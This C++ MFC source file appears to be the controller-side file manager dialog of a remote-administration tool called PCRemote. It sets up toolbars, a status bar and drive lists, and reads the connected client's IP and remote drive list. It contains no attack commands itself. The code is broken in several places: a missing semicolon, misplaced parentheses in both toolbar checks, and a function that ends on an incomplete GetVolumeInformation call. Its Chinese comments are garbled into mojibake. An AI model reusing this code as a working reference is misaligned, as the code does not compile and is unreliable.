// FileManagerDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "PCRemote.h"
#include "FileManagerDlg.h"
#include "afxdialogex.h"
#include "FileTransferModeDlg.h"
#include "..\common\macros.h"

// CFileManagerDlg �Ի���

static UINT indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialogEx)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(CFileManagerDlg::IDD, pParent)
{
	SHFILEINFO sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	m_hIcon = sfi.hIcon;

	HIMAGELIST hImageList;	//����ϵͳͼ���б�
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_LARGEICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Large = CImageList::FromHandle(hImageList);

	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
		sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_pImageList_Small = CImageList::FromHandle(hImageList);


	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	sockaddr_in sockAddr;
	int nSockAddrLen = sizeof(sockaddr_in)
	memset(&sockAddr, 0, nSockAddrLen);

	//�õ����ӿͻ��˵�IP
	int nResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, nSockAddrLen);
	m_IPAddress = (nResult != SOCKET_ERROR) ? inet_ntoa(sockAddr.sin_addr) : "";

	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, 
		   m_pContext->m_DeCompressionBuffer.GetBuffer(1), 
		   m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);

	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;

	m_bIsStop = FALSE;
}

CFileManagerDlg::~CFileManagerDlg()
{
}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LOCAL_PATH, m_Local_Directory_ComboBox);
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_LOCAL, m_list_local);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CFileManagerDlg ��Ϣ�������


BOOL CFileManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon, FALSE);

	RECT rect;
	GetClientRect(&rect);

	//Ϊ��ʹ�������Ӵ���
	if (!m_wndToolBar_Local.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY)) ||
		!m_wndToolBar_Local.LoadToolBar(IDR_TOOLBAR1)
	{
		TRACE0("Failed to create toolbar");
		return FALSE;
	}
	m_wndToolBar_Local.ModifyStyle(0, TBSTYLE_FLAT);
	m_wndToolBar_Local.LoadTrueColorToolBar(
		24,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE);
	// ���������ť
	m_wndToolBar_Local.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);


	if (!m_wndToolBar_Remote.Create(this, WS_CHILD |
		WS_VISIBLE | CBRS_ALIGN_ANY | CBRS_TOOLTIPS | CBRS_FLYBY)) ||
		!m_wndToolBar_Remote.LoadToolBar(IDR_TOOLBAR1)
	{
		TRACE0("Failed to create toolbar");
		return FALSE;
	}
	m_wndToolBar_Remote.ModifyStyle(0, TBSTYLE_FLAT);
	m_wndToolBar_Remote.LoadTrueColorToolBar(
		24,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_ENABLE,
		IDB_TOOLBAR_DISABLE);
	// ���������ť
	m_wndToolBar_Remote.AddDropDownButton(this, IDT_LOCAL_VIEW, IDR_LOCAL_VIEW);

	//��ʾ������
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);

	//���ñ���
	CString str;
	str.Format("\\\\%s - �ļ�����", m_IPAddress);
	SetWindowText(str);

	//Ϊ�б�����ImageList
	m_list_local.SetImageList(m_pImageList_Large, LVSIL_NORMAL);
	m_list_local.SetImageList(m_pImageList_Small, LVSIL_SMALL);

	//��������������״̬��
	if (!m_wndStatusBar.Create(this) || 
		!m_wndStatusBar.SetIndicators(indicators, sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return FALSE;
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ״̬��

	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl = new CProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
	m_ProgressCtrl->SetRange(0, 100);	//���ý�������Χ
	m_ProgressCtrl->SetPos(20);			//���ý�������ǰλ��

	//��ʼ�������������б�����ʾ�����������б�
	FixedLocalDriveList();
	//��ʼ���ͻ����������б�����ʾ�ͻ����������б�
	FixedRmoteDriveList();

	m_bDragging = FALSE;
	m_nDragIndex = -1;
	m_nDropIndex = -1;

	CoInitialize(NULL);
	SHAutoComplete(GetDlgItem(IDC_LOCAL_PATH)->m_hWnd, SHACF_FILESYSTEM);

	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);

	// TODO: �ڴ˴������Ϣ����������
	if(!m_wndStatusBar.m_hWnd)			//״̬����û����
		return ;

	// ��λ״̬��
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //��ʾ������
	RECT	rect;
	m_wndStatusBar.GetItemRect(1, &rect);
	m_ProgressCtrl->MoveWindow(&rect);

	GetDlgItem(IDC_LIST_LOCAL)->MoveWindow(0, 36, cx, (cy - 100) / 2);
	GetDlgItem(IDC_LIST_REMOTE)->MoveWindow(0, (cy / 2) + 28, cx, (cy - 100) / 2);
	GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(20, cy / 2, 25, 20);
	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(53, (cy / 2) - 4 , 210, 12);


	GetClientRect(&rect);
	//��ʾ������
	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
	m_wndToolBar_Remote.MoveWindow(268, rect.bottom / 2 - 10, rect.right - 268, 48);
}

void CFileManagerDlg::FixedLocalDriveList()
{
	char szDrive[MAX_PATH] = {0};
	char *pDrive = NULL;
	m_list_local.DeleteAllItems();
	while(m_list_local.DeleteColumn(0));

	//��ʼ���б���Ϣ
	m_list_local.InsertColumn(0, "����", LVCFMT_LEFT, 200);
	m_list_local.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
	m_list_local.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);

	GetLogicalDriveStrings(MAX_PATH, szDrive);
	pDrive = szDrive;

	char szFileSystem[MAX_PATH];
	unsigned __int64 HDTotalSpace = 0;
	unsigned __int64 HDFreeSpace  = 0;
	unsigned long TotalMB = 0; //�ܴ�С
	unsigned long FreeMB  = 0;  //ʣ��ռ�

	for (int i = 0; *pDrive != '\0'; i++, pDrive += lstrlen(pDrive) + 1)
	{
		memset(szFileSystem, 0, sizeof(szFileSystem));
		GetVolumeInformation
	}

}